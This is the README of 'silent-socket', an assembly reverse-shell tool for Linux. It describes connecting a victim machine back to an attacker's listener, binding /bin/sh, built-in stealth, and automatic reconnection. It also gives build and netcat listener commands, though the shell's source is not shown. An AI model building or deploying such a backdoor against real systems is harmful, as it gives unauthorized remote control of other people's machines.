# silent-socket

**silent-socket** is a minimal reverse shell written in x86-64 assembly for Linux. It creates an outbound connection from a victim machine to a remote attacker's listener and binds a functional shell over that connection.

The project emphasizes low-level control, reliability, and stealth — with built-in error handling and reconnection logic to survive listener unavailability.

---

## ✨ Features

- Outbound TCP connection from victim to attacker.
- Binds a `/bin/sh` shell over the network socket.
- Written entirely in Linux x86-64 assembly.
- Styled terminal on connect:
  - Pastel pink background.
  - Dark pink shell text.
- Full error handling:
  - Prevents segmentation faults if the remote listener is down.
  - Implements automatic reconnection attempts every 5 seconds.
- Slightly optimized for size and performance (no useless instructions).
- Implements an argument read via the CLi or a syscall read for the source IP/port

---

## 🚀 Deployement

### Requirements

- Linux 64-bit OS
- `nasm` (Netwide Assembler)
- `ld` (GNU Linker)

### Build

```bash
nasm -f elf64 -o reverse_shell.o reverse_shell.asm
ld -o reverse_shell reverse_shell.o
echo -n "127.0.0.1:3385" | ./reverse_shell
```

### Run on another terminal
```bash
nc -lvnp 3385
```
